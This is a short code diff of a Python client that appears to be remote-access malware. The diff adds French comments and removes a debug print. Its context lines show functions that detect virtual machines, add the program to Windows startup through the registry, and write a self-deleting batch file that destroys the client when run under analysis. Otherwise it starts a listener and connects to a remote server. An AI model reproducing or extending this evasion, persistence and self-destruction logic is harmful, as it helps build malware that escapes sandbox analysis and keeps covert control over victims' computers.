@@ -11,6 +11,7 @@ from media_utils import start_listener
 from network_utils import start_client
 
 
+# Fonction pour vérifier si le client est exécuté dans une machine virtuelle
 def check_vm():
     uname = platform.uname()
     common_vm_signals = ["vm", "virtual", "hyperv", "xen", "kvm", "vbox", "qemu"]
@@ -41,6 +42,7 @@ def check_vm():
     return False
 
 
+# Fonction pour ajouter le client au démarrage de Windows
 def add_to_startup(file_path=None):
     if file_path is None:
         file_path = os.path.abspath(sys.argv[0])
@@ -60,6 +62,7 @@ def add_to_startup(file_path=None):
     winreg.CloseKey(key)
 
 
+# Fonction pour créer un fichier batch pour supprimer le client
 def create_deletion_batch():
     batch_content = """
 @echo off
@@ -74,6 +77,7 @@ del "%~f0"
     return batch_path
 
 
+# Fonction pour détruire le client
 def self_destruction():
     try:
         batch_path = create_deletion_batch()
@@ -86,7 +90,6 @@ def main():
     if check_vm():
         self_destruction()
     else:
-        print("Running on a physical machine.")
         # add_to_startup()
         threading.Thread(target=start_listener).start()
         start_client(server_url)
